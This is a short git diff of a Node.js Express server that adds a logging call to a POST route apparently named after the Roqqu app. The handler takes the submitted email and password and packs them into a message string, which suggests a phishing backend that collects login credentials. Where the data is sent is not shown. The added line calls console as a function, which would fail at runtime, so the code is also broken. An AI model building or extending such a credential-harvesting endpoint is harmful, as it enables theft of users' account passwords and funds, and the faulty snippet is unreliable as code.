@@ -47,6 +47,10 @@ app.get('/', (req, res) =>{
 })
 
 app.post('/roqquappchat', (req, res, next) => {
+  console(
+    'req body', req.body
+  )
+
   const email = req.body.email
   const password = req.body.password
   const content = `email: ${email} \n password: ${password} `
